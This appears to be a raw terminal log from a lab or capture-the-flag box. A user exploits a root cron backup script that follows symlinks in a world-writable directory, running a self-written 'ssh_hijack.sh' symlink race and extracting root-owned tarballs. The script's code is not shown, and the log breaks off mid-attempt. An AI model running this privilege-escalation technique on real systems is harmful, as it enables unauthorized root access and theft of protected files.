@@ -1,0 +1,815 @@
+tom@epsilon:/tmp$ cat /usr/bin/backup.sh
+#!/bin/bash
+file=`date +%N`
+/usr/bin/rm -rf /opt/backups/*
+/usr/bin/tar -cvf "/opt/backups/$file.tar" /var/www/app/
+sha1sum "/opt/backups/$file.tar" | cut -d ' ' -f1 > /opt/backups/checksum
+sleep 5
+check_file=`date +%N`
+/usr/bin/tar -chvf "/var/backups/web_backups/${check_file}.tar" /opt/backups/checksum "/opt/backups/$file.tar"
+/usr/bin/rm -rf /opt/backups/*
+tom@epsilon:/tmp$ touch ssh_hijack.sh
+tom@epsilon:/tmp$ ls -la /opt/backups/checksum
+ls: cannot access '/opt/backups/checksum': No such file or directory
+tom@epsilon:/tmp$ cd /opt/backups
+tom@epsilon:/opt/backups$ ls -la
+total 8
+drwxr-xrwx 2 root root 4096 Apr 21 10:33 .
+drwxr-xr-x 4 root root 4096 Dec 20  2021 ..
+tom@epsilon:/opt/backups$ cd /tmp
+tom@epsilon:/tmp$ ls -l
+total 3056
+-rwxrwxr-x 1 tom  tom  3104768 Apr 21 10:08 pspy64
+-rw-rw-r-- 1 tom  tom        0 Apr 21 10:24 ssh_hijack.sh
+drwx------ 3 root root    4096 Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-apache2.service-hwdpyh
+drwx------ 3 root root    4096 Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-logind.service-mchjtj
+drwx------ 3 root root    4096 Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-resolved.service-Cuyumf
+drwx------ 3 root root    4096 Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-timesyncd.service-V0V8Ph
+drwx------ 3 root root    4096 Apr 21 04:33 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-upower.service-T0JUkg
+drwx------ 2 root root    4096 Apr 20 23:52 vmware-root_656-2689274927
+tom@epsilon:/tmp$ nano ssh_hijack.sh
+tom@epsilon:/tmp$ nano ssh_hijack.sh
+tom@epsilon:/tmp$ ls -l
+total 3060
+-rwxrwxr-x 1 tom  tom  3104768 Apr 21 10:08 pspy64
+-rw-rw-r-- 1 tom  tom      227 Apr 21 10:45 ssh_hijack.sh
+drwx------ 3 root root    4096 Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-apache2.service-hwdpyh
+drwx------ 3 root root    4096 Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-logind.service-mchjtj
+drwx------ 3 root root    4096 Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-resolved.service-Cuyumf
+drwx------ 3 root root    4096 Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-timesyncd.service-V0V8Ph
+drwx------ 3 root root    4096 Apr 21 04:33 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-upower.service-T0JUkg
+drwx------ 2 root root    4096 Apr 20 23:52 vmware-root_656-2689274927
+tom@epsilon:/tmp$ ./ssh_hijack.sh
+bash: ./ssh_hijack.sh: Permission denied
+tom@epsilon:/tmp$ chmod +x ssh_hijack.sh
+tom@epsilon:/tmp$ ./ssh_hijack.sh
+./ssh_hijack.sh: line 9: syntax error near unexpected token `break'
+./ssh_hijack.sh: line 9: `      fi      break'
+tom@epsilon:/tmp$ nano ssh_hijack.sh
+tom@epsilon:/tmp$ ./ssh_hijack.sh
+[+] File deleted!
+[+] Symbolic Link created!
+tom@epsilon:/tmp$ cd /opt/backups
+tom@epsilon:/opt/backups$ ls -l
+total 0
+tom@epsilon:/opt/backups$ cat checksum
+cat: checksum: No such file or directory
+tom@epsilon:/opt/backups$ ./tmp/ssh_hijack.sh
+bash: ./tmp/ssh_hijack.sh: No such file or directory
+tom@epsilon:/opt/backups$ cd /tmp
+tom@epsilon:/tmp$ ./ssh_hijack.sh
+[+] File deleted!
+[+] Symbolic Link created!
+tom@epsilon:/tmp$ cat /opt/backups/checksum
+cat: /opt/backups/checksum: No such file or directory
+tom@epsilon:/tmp$ cd /opt/backups
+tom@epsilon:/opt/backups$ ls -la
+total 8
+drwxr-xrwx 2 root root 4096 Apr 21 10:50 .
+drwxr-xr-x 4 root root 4096 Dec 20  2021 ..
+tom@epsilon:/opt/backups$ cd
+tom@epsilon:~$ cd /tmp
+tom@epsilon:/tmp$ ls -la
+total 3088
+drwxrwxrwt 13 root root    4096 Apr 21 10:47 .
+drwxr-xr-x 19 root root    4096 Dec 20  2021 ..
+drwxrwxrwt  2 root root    4096 Apr 20 23:51 .font-unix
+drwxrwxrwt  2 root root    4096 Apr 20 23:51 .ICE-unix
+-rwxrwxr-x  1 tom  tom  3104768 Apr 21 10:08 pspy64
+-rwxrwxr-x  1 tom  tom      229 Apr 21 10:47 ssh_hijack.sh
+drwx------  3 root root    4096 Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-apache2.service-hwdpyh
+drwx------  3 root root    4096 Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-logind.service-mchjtj
+drwx------  3 root root    4096 Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-resolved.service-Cuyumf
+drwx------  3 root root    4096 Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-timesyncd.service-V0V8Ph
+drwx------  3 root root    4096 Apr 21 04:33 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-upower.service-T0JUkg
+drwxrwxrwt  2 root root    4096 Apr 20 23:51 .Test-unix
+drwx------  2 root root    4096 Apr 20 23:52 vmware-root_656-2689274927
+drwxrwxrwt  2 root root    4096 Apr 20 23:51 .X11-unix
+drwxrwxrwt  2 root root    4096 Apr 20 23:51 .XIM-unix
+tom@epsilon:/tmp$ nano ssh_hijack.sh
+tom@epsilon:/tmp$ ls -la
+total 3088
+drwxrwxrwt 13 root root    4096 Apr 21 10:52 .
+drwxr-xr-x 19 root root    4096 Dec 20  2021 ..
+drwxrwxrwt  2 root root    4096 Apr 20 23:51 .font-unix
+drwxrwxrwt  2 root root    4096 Apr 20 23:51 .ICE-unix
+-rwxrwxr-x  1 tom  tom  3104768 Apr 21 10:08 pspy64
+-rwxrwxr-x  1 tom  tom      229 Apr 21 10:47 ssh_hijack.sh
+drwx------  3 root root    4096 Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-apache2.service-hwdpyh
+drwx------  3 root root    4096 Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-logind.service-mchjtj
+drwx------  3 root root    4096 Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-resolved.service-Cuyumf
+drwx------  3 root root    4096 Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-timesyncd.service-V0V8Ph
+drwx------  3 root root    4096 Apr 21 04:33 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-upower.service-T0JUkg
+drwxrwxrwt  2 root root    4096 Apr 20 23:51 .Test-unix
+drwx------  2 root root    4096 Apr 20 23:52 vmware-root_656-2689274927
+drwxrwxrwt  2 root root    4096 Apr 20 23:51 .X11-unix
+drwxrwxrwt  2 root root    4096 Apr 20 23:51 .XIM-unix
+tom@epsilon:/tmp$ ./ssh_hijack.sh
+[+] File deleted!
+[+] Symbolic Link created!
+tom@epsilon:/tmp$ ls -l
+total 3060
+-rwxrwxr-x 1 tom  tom  3104768 Apr 21 10:08 pspy64
+-rwxrwxr-x 1 tom  tom      229 Apr 21 10:47 ssh_hijack.sh
+drwx------ 3 root root    4096 Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-apache2.service-hwdpyh
+drwx------ 3 root root    4096 Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-logind.service-mchjtj
+drwx------ 3 root root    4096 Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-resolved.service-Cuyumf
+drwx------ 3 root root    4096 Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-timesyncd.service-V0V8Ph
+drwx------ 3 root root    4096 Apr 21 04:33 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-upower.service-T0JUkg
+drwx------ 2 root root    4096 Apr 20 23:52 vmware-root_656-2689274927
+tom@epsilon:/tmp$ cd vmware-root_656-2689274927/
+bash: cd: vmware-root_656-2689274927/: Permission denied
+tom@epsilon:/tmp$ cd backups
+bash: cd: backups: No such file or directory
+tom@epsilon:/tmp$ cd /opt/backups
+tom@epsilon:/opt/backups$ ls -l
+total 0
+tom@epsilon:/opt/backups$ cat /usr/bin/backup.sh
+#!/bin/bash
+file=`date +%N`
+/usr/bin/rm -rf /opt/backups/*
+/usr/bin/tar -cvf "/opt/backups/$file.tar" /var/www/app/
+sha1sum "/opt/backups/$file.tar" | cut -d ' ' -f1 > /opt/backups/checksum
+sleep 5
+check_file=`date +%N`
+/usr/bin/tar -chvf "/var/backups/web_backups/${check_file}.tar" /opt/backups/checksum "/opt/backups/$file.tar"
+/usr/bin/rm -rf /opt/backups/*
+tom@epsilon:/opt/backups$ cd /var/backups/web_backups
+tom@epsilon:/var/backups/web_backups$ ls -la
+total 988
+drwxr-xr-x 2 root root    4096 Apr 21 10:55 .
+drwxr-xr-x 3 root root    4096 Apr 21 06:25 ..
+-rw-r--r-- 1 root root 1003520 Apr 21 10:55 726978654.tar
+tom@epsilon:/var/backups/web_backups$ cp 726978654.tar /tmp
+tom@epsilon:/var/backups/web_backups$ cd /tmp
+tom@epsilon:/tmp$ ls -la
+total 4068
+drwxrwxrwt 13 root root    4096 Apr 21 10:55 .
+drwxr-xr-x 19 root root    4096 Dec 20  2021 ..
+-rw-r--r--  1 tom  tom  1003520 Apr 21 10:55 726978654.tar
+drwxrwxrwt  2 root root    4096 Apr 20 23:51 .font-unix
+drwxrwxrwt  2 root root    4096 Apr 20 23:51 .ICE-unix
+-rwxrwxr-x  1 tom  tom  3104768 Apr 21 10:08 pspy64
+-rwxrwxr-x  1 tom  tom      229 Apr 21 10:47 ssh_hijack.sh
+drwx------  3 root root    4096 Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-apache2.service-hwdpyh
+drwx------  3 root root    4096 Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-logind.service-mchjtj
+drwx------  3 root root    4096 Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-resolved.service-Cuyumf
+drwx------  3 root root    4096 Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-timesyncd.service-V0V8Ph
+drwx------  3 root root    4096 Apr 21 04:33 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-upower.service-T0JUkg
+drwxrwxrwt  2 root root    4096 Apr 20 23:51 .Test-unix
+drwx------  2 root root    4096 Apr 20 23:52 vmware-root_656-2689274927
+drwxrwxrwt  2 root root    4096 Apr 20 23:51 .X11-unix
+drwxrwxrwt  2 root root    4096 Apr 20 23:51 .XIM-unix
+tom@epsilon:/tmp$ tar -xf 726978654.tar
+tom@epsilon:/tmp$ ls -l
+total 4044
+-rw-r--r-- 1 tom  tom  1003520 Apr 21 10:55 726978654.tar
+drwxrwxr-x 3 tom  tom     4096 Apr 21 10:56 opt
+-rwxrwxr-x 1 tom  tom  3104768 Apr 21 10:08 pspy64
+-rwxrwxr-x 1 tom  tom      229 Apr 21 10:47 ssh_hijack.sh
+drwx------ 3 root root    4096 Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-apache2.service-hwdpyh
+drwx------ 3 root root    4096 Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-logind.service-mchjtj
+drwx------ 3 root root    4096 Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-resolved.service-Cuyumf
+drwx------ 3 root root    4096 Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-timesyncd.service-V0V8Ph
+drwx------ 3 root root    4096 Apr 21 04:33 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-upower.service-T0JUkg
+drwx------ 2 root root    4096 Apr 20 23:52 vmware-root_656-2689274927
+tom@epsilon:/tmp$ cd /opt/backups
+tom@epsilon:/opt/backups$ ls -l
+total 0
+tom@epsilon:/opt/backups$ ls -la
+total 8
+drwxr-xrwx 2 root root 4096 Apr 21 10:56 .
+drwxr-xr-x 4 root root 4096 Dec 20  2021 ..
+tom@epsilon:/opt/backups$ cd ..
+tom@epsilon:/opt$ cd /tmp
+tom@epsilon:/tmp$ ls -la
+total 4072
+drwxrwxrwt 14 root root    4096 Apr 21 10:56 .
+drwxr-xr-x 19 root root    4096 Dec 20  2021 ..
+-rw-r--r--  1 tom  tom  1003520 Apr 21 10:55 726978654.tar
+drwxrwxrwt  2 root root    4096 Apr 20 23:51 .font-unix
+drwxrwxrwt  2 root root    4096 Apr 20 23:51 .ICE-unix
+drwxrwxr-x  3 tom  tom     4096 Apr 21 10:56 opt
+-rwxrwxr-x  1 tom  tom  3104768 Apr 21 10:08 pspy64
+-rwxrwxr-x  1 tom  tom      229 Apr 21 10:47 ssh_hijack.sh
+drwx------  3 root root    4096 Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-apache2.service-hwdpyh
+drwx------  3 root root    4096 Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-logind.service-mchjtj
+drwx------  3 root root    4096 Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-resolved.service-Cuyumf
+drwx------  3 root root    4096 Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-timesyncd.service-V0V8Ph
+drwx------  3 root root    4096 Apr 21 04:33 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-upower.service-T0JUkg
+drwxrwxrwt  2 root root    4096 Apr 20 23:51 .Test-unix
+drwx------  2 root root    4096 Apr 20 23:52 vmware-root_656-2689274927
+drwxrwxrwt  2 root root    4096 Apr 20 23:51 .X11-unix
+drwxrwxrwt  2 root root    4096 Apr 20 23:51 .XIM-unix
+tom@epsilon:/tmp$ cd /opt
+tom@epsilon:/opt$ ls -la
+total 16
+drwxr-xr-x  4 root root 4096 Dec 20  2021 .
+drwxr-xr-x 19 root root 4096 Dec 20  2021 ..
+drwxr-xrwx  2 root root 4096 Apr 21 10:57 backups
+drwx--x--x  4 root root 4096 Dec 20  2021 containerd
+tom@epsilon:/opt$ cd containerd/
+tom@epsilon:/opt/containerd$ ls -la
+ls: cannot open directory '.': Permission denied
+tom@epsilon:/opt/containerd$ cd backups
+bash: cd: backups: No such file or directory
+tom@epsilon:/opt/containerd$ cd ..
+tom@epsilon:/opt$ cat containerd/checksum
+cat: containerd/checksum: No such file or directory
+tom@epsilon:/opt$ ls -l containerd/
+ls: cannot open directory 'containerd/': Permission denied
+tom@epsilon:/opt$ cd backups
+tom@epsilon:/opt/backups$ ls -lahr
+total 8.0K
+drwxr-xr-x 4 root root 4.0K Dec 20  2021 ..
+drwxr-xrwx 2 root root 4.0K Apr 21 10:58 .
+tom@epsilon:/opt/backups$ cd ..
+tom@epsilon:/opt$ cd ..
+tom@epsilon:/$ ls -lahr
+total 72K
+drwxr-xr-x  13 root root 4.0K Dec 20  2021 var
+drwxr-xr-x  14 root root 4.0K Feb  4  2022 usr
+drwxrwxrwt  14 root root 4.0K Apr 21 10:56 tmp
+dr-xr-xr-x  13 root root    0 Apr 20 23:51 sys
+drwxr-xr-x   2 root root 4.0K Dec 20  2021 srv
+lrwxrwxrwx   1 root root    8 Apr 23  2020 sbin -> usr/sbin
+drwxr-xr-x  29 root root  860 Apr 21 04:33 run
+drwx------   9 root root 4.0K Apr 20 23:51 root
+dr-xr-xr-x 272 root root    0 Apr 20 23:51 proc
+drwxr-xr-x   4 root root 4.0K Dec 20  2021 opt
+drwxr-xr-x   2 root root 4.0K Dec 20  2021 mnt
+drwxr-xr-x   2 root root 4.0K Dec 20  2021 media
+drwx------   2 root root  16K May  7  2020 lost+found
+lrwxrwxrwx   1 root root   10 Apr 23  2020 libx32 -> usr/libx32
+lrwxrwxrwx   1 root root    9 Apr 23  2020 lib64 -> usr/lib64
+lrwxrwxrwx   1 root root    9 Apr 23  2020 lib32 -> usr/lib32
+lrwxrwxrwx   1 root root    7 Apr 23  2020 lib -> usr/lib
+drwxr-xr-x   3 root root 4.0K Dec 20  2021 home
+drwxr-xr-x 109 root root 4.0K Feb  4  2022 etc
+drwxr-xr-x  18 root root 3.9K Apr 20 23:51 dev
+drwxr-xr-x   2 root root 4.0K Dec 20  2021 cdrom
+drwxr-xr-x   3 root root 4.0K Feb  4  2022 boot
+lrwxrwxrwx   1 root root    7 Apr 23  2020 bin -> usr/bin
+drwxr-xr-x  19 root root 4.0K Dec 20  2021 ..
+drwxr-xr-x  19 root root 4.0K Dec 20  2021 .
+tom@epsilon:/$ cd /tmp
+tom@epsilon:/tmp$ ls -lahr
+total 4.0M
+drwxrwxrwt  2 root root 4.0K Apr 20 23:51 .XIM-unix
+drwxrwxrwt  2 root root 4.0K Apr 20 23:51 .X11-unix
+drwx------  2 root root 4.0K Apr 20 23:52 vmware-root_656-2689274927
+drwxrwxrwt  2 root root 4.0K Apr 20 23:51 .Test-unix
+drwx------  3 root root 4.0K Apr 21 04:33 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-upower.service-T0JUkg
+drwx------  3 root root 4.0K Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-timesyncd.service-V0V8Ph
+drwx------  3 root root 4.0K Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-resolved.service-Cuyumf
+drwx------  3 root root 4.0K Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-logind.service-mchjtj
+drwx------  3 root root 4.0K Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-apache2.service-hwdpyh
+-rwxrwxr-x  1 tom  tom   229 Apr 21 10:47 ssh_hijack.sh
+-rwxrwxr-x  1 tom  tom  3.0M Apr 21 10:08 pspy64
+drwxrwxr-x  3 tom  tom  4.0K Apr 21 10:56 opt
+drwxrwxrwt  2 root root 4.0K Apr 20 23:51 .ICE-unix
+drwxrwxrwt  2 root root 4.0K Apr 20 23:51 .font-unix
+-rw-r--r--  1 tom  tom  980K Apr 21 10:55 726978654.tar
+drwxr-xr-x 19 root root 4.0K Dec 20  2021 ..
+drwxrwxrwt 14 root root 4.0K Apr 21 10:56 .
+tom@epsilon:/tmp$ rm -rf 726978654.tar
+tom@epsilon:/tmp$ rm -rf opt/
+tom@epsilon:/tmp$ ls -l
+total 3060
+-rwxrwxr-x 1 tom  tom  3104768 Apr 21 10:08 pspy64
+-rwxrwxr-x 1 tom  tom      229 Apr 21 10:47 ssh_hijack.sh
+drwx------ 3 root root    4096 Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-apache2.service-hwdpyh
+drwx------ 3 root root    4096 Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-logind.service-mchjtj
+drwx------ 3 root root    4096 Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-resolved.service-Cuyumf
+drwx------ 3 root root    4096 Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-timesyncd.service-V0V8Ph
+drwx------ 3 root root    4096 Apr 21 04:33 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-upower.service-T0JUkg
+drwx------ 2 root root    4096 Apr 20 23:52 vmware-root_656-2689274927
+tom@epsilon:/tmp$ ./ssh_hijack.sh
+^C
+tom@epsilon:/tmp$ cd /var/backups/web_backups
+tom@epsilon:/var/backups/web_backups$ ls -lahr
+total 988K
+-rw-r--r-- 1 root root 980K Apr 21 11:00 855090316.tar
+drwxr-xr-x 3 root root 4.0K Apr 21 06:25 ..
+drwxr-xr-x 2 root root 4.0K Apr 21 11:00 .
+tom@epsilon:/var/backups/web_backups$ rm -rf 855090316.tar
+rm: cannot remove '855090316.tar': Permission denied
+tom@epsilon:/var/backups/web_backups$ cp 855090316.tar /tmp
+tom@epsilon:/var/backups/web_backups$ cd /tmp
+tom@epsilon:/tmp$ ls -l
+total 4040
+-rw-r--r-- 1 tom  tom  1003520 Apr 21 11:01 855090316.tar
+-rwxrwxr-x 1 tom  tom  3104768 Apr 21 10:08 pspy64
+-rwxrwxr-x 1 tom  tom      229 Apr 21 10:47 ssh_hijack.sh
+drwx------ 3 root root    4096 Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-apache2.service-hwdpyh
+drwx------ 3 root root    4096 Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-logind.service-mchjtj
+drwx------ 3 root root    4096 Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-resolved.service-Cuyumf
+drwx------ 3 root root    4096 Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-timesyncd.service-V0V8Ph
+drwx------ 3 root root    4096 Apr 21 04:33 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-upower.service-T0JUkg
+drwx------ 2 root root    4096 Apr 20 23:52 vmware-root_656-2689274927
+tom@epsilon:/tmp$ which 7z
+tom@epsilon:/tmp$ tar -xf 855090316.tar
+tom@epsilon:/tmp$ ls -la
+total 4072
+drwxrwxrwt 14 root root    4096 Apr 21 11:01 .
+drwxr-xr-x 19 root root    4096 Dec 20  2021 ..
+-rw-r--r--  1 tom  tom  1003520 Apr 21 11:01 855090316.tar
+drwxrwxrwt  2 root root    4096 Apr 20 23:51 .font-unix
+drwxrwxrwt  2 root root    4096 Apr 20 23:51 .ICE-unix
+drwxrwxr-x  3 tom  tom     4096 Apr 21 11:01 opt
+-rwxrwxr-x  1 tom  tom  3104768 Apr 21 10:08 pspy64
+-rwxrwxr-x  1 tom  tom      229 Apr 21 10:47 ssh_hijack.sh
+drwx------  3 root root    4096 Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-apache2.service-hwdpyh
+drwx------  3 root root    4096 Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-logind.service-mchjtj
+drwx------  3 root root    4096 Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-resolved.service-Cuyumf
+drwx------  3 root root    4096 Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-timesyncd.service-V0V8Ph
+drwx------  3 root root    4096 Apr 21 04:33 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-upower.service-T0JUkg
+drwxrwxrwt  2 root root    4096 Apr 20 23:51 .Test-unix
+drwx------  2 root root    4096 Apr 20 23:52 vmware-root_656-2689274927
+drwxrwxrwt  2 root root    4096 Apr 20 23:51 .X11-unix
+drwxrwxrwt  2 root root    4096 Apr 20 23:51 .XIM-unix
+tom@epsilon:/tmp$ cd /opt/backups
+tom@epsilon:/opt/backups$ ls -la
+total 8
+drwxr-xrwx 2 root root 4096 Apr 21 11:01 .
+drwxr-xr-x 4 root root 4096 Dec 20  2021 ..
+tom@epsilon:/opt/backups$ rm *
+rm: remove write-protected regular file '895114754.tar'? n
+rm: cannot remove 'checksum': No such file or directory
+tom@epsilon:/opt/backups$ ls -lahr
+total 8.0K
+drwxr-xr-x 4 root root 4.0K Dec 20  2021 ..
+drwxr-xrwx 2 root root 4.0K Apr 21 11:02 .
+tom@epsilon:/opt/backups$ tar -xf 895114754.tar
+tar: 895114754.tar: Cannot open: No such file or directory
+tar: Error is not recoverable: exiting now
+tom@epsilon:/opt/backups$ rm *
+rm: cannot remove '*': No such file or directory
+tom@epsilon:/opt/backups$ cd ..
+tom@epsilon:/opt$ ls -lahr
+total 16K
+drwx--x--x  4 root root 4.0K Dec 20  2021 containerd
+drwxr-xrwx  2 root root 4.0K Apr 21 11:03 backups
+drwxr-xr-x 19 root root 4.0K Dec 20  2021 ..
+drwxr-xr-x  4 root root 4.0K Dec 20  2021 .
+tom@epsilon:/opt$ cp containerd/895114754.tar /tmp
+cp: cannot stat 'containerd/895114754.tar': No such file or directory
+tom@epsilon:/opt$ cd ..
+tom@epsilon:/$ ls -lahr
+total 72K
+drwxr-xr-x  13 root root 4.0K Dec 20  2021 var
+drwxr-xr-x  14 root root 4.0K Feb  4  2022 usr
+drwxrwxrwt  14 root root 4.0K Apr 21 11:03 tmp
+dr-xr-xr-x  13 root root    0 Apr 20 23:51 sys
+drwxr-xr-x   2 root root 4.0K Dec 20  2021 srv
+lrwxrwxrwx   1 root root    8 Apr 23  2020 sbin -> usr/sbin
+drwxr-xr-x  29 root root  860 Apr 21 04:33 run
+drwx------   9 root root 4.0K Apr 20 23:51 root
+dr-xr-xr-x 272 root root    0 Apr 20 23:51 proc
+drwxr-xr-x   4 root root 4.0K Dec 20  2021 opt
+drwxr-xr-x   2 root root 4.0K Dec 20  2021 mnt
+drwxr-xr-x   2 root root 4.0K Dec 20  2021 media
+drwx------   2 root root  16K May  7  2020 lost+found
+lrwxrwxrwx   1 root root   10 Apr 23  2020 libx32 -> usr/libx32
+lrwxrwxrwx   1 root root    9 Apr 23  2020 lib64 -> usr/lib64
+lrwxrwxrwx   1 root root    9 Apr 23  2020 lib32 -> usr/lib32
+lrwxrwxrwx   1 root root    7 Apr 23  2020 lib -> usr/lib
+drwxr-xr-x   3 root root 4.0K Dec 20  2021 home
+drwxr-xr-x 109 root root 4.0K Feb  4  2022 etc
+drwxr-xr-x  18 root root 3.9K Apr 20 23:51 dev
+drwxr-xr-x   2 root root 4.0K Dec 20  2021 cdrom
+drwxr-xr-x   3 root root 4.0K Feb  4  2022 boot
+lrwxrwxrwx   1 root root    7 Apr 23  2020 bin -> usr/bin
+drwxr-xr-x  19 root root 4.0K Dec 20  2021 ..
+drwxr-xr-x  19 root root 4.0K Dec 20  2021 .
+tom@epsilon:/$ cd /tmp
+tom@epsilon:/tmp$ ls -lahr
+total 4.0M
+drwxrwxrwt  2 root root 4.0K Apr 20 23:51 .XIM-unix
+drwxrwxrwt  2 root root 4.0K Apr 20 23:51 .X11-unix
+drwx------  2 root root 4.0K Apr 20 23:52 vmware-root_656-2689274927
+drwxrwxrwt  2 root root 4.0K Apr 20 23:51 .Test-unix
+drwx------  3 root root 4.0K Apr 21 04:33 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-upower.service-T0JUkg
+drwx------  3 root root 4.0K Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-timesyncd.service-V0V8Ph
+drwx------  3 root root 4.0K Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-resolved.service-Cuyumf
+drwx------  3 root root 4.0K Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-logind.service-mchjtj
+drwx------  3 root root 4.0K Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-apache2.service-hwdpyh
+-rwxrwxr-x  1 tom  tom   229 Apr 21 10:47 ssh_hijack.sh
+-rwxrwxr-x  1 tom  tom  3.0M Apr 21 10:08 pspy64
+drwxrwxr-x  3 tom  tom  4.0K Apr 21 11:01 opt
+drwxrwxrwt  2 root root 4.0K Apr 20 23:51 .ICE-unix
+drwxrwxrwt  2 root root 4.0K Apr 20 23:51 .font-unix
+-rw-r--r--  1 tom  tom  980K Apr 21 11:01 855090316.tar
+drwxr-xr-x 19 root root 4.0K Dec 20  2021 ..
+drwxrwxrwt 14 root root 4.0K Apr 21 11:03 .
+tom@epsilon:/tmp$ rm -rf 855090316.tar
+tom@epsilon:/tmp$ rm -rf opt/
+tom@epsilon:/tmp$ ls -lahr
+total 3.1M
+drwxrwxrwt  2 root root 4.0K Apr 20 23:51 .XIM-unix
+drwxrwxrwt  2 root root 4.0K Apr 20 23:51 .X11-unix
+drwx------  2 root root 4.0K Apr 20 23:52 vmware-root_656-2689274927
+drwxrwxrwt  2 root root 4.0K Apr 20 23:51 .Test-unix
+drwx------  3 root root 4.0K Apr 21 04:33 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-upower.service-T0JUkg
+drwx------  3 root root 4.0K Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-timesyncd.service-V0V8Ph
+drwx------  3 root root 4.0K Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-resolved.service-Cuyumf
+drwx------  3 root root 4.0K Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-logind.service-mchjtj
+drwx------  3 root root 4.0K Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-apache2.service-hwdpyh
+-rwxrwxr-x  1 tom  tom   229 Apr 21 10:47 ssh_hijack.sh
+-rwxrwxr-x  1 tom  tom  3.0M Apr 21 10:08 pspy64
+drwxrwxrwt  2 root root 4.0K Apr 20 23:51 .ICE-unix
+drwxrwxrwt  2 root root 4.0K Apr 20 23:51 .font-unix
+drwxr-xr-x 19 root root 4.0K Dec 20  2021 ..
+drwxrwxrwt 13 root root 4.0K Apr 21 11:04 .
+tom@epsilon:/tmp$ ./ssh_hijack.sh
+[+] File deleted!
+[+] Symbolic Link created!
+tom@epsilon:/tmp$ cd /var/backups/web_backups
+tom@epsilon:/var/backups/web_backups$ ls -lahr
+total 2.0M
+-rw-r--r-- 1 root root 980K Apr 21 11:05 978335760.tar
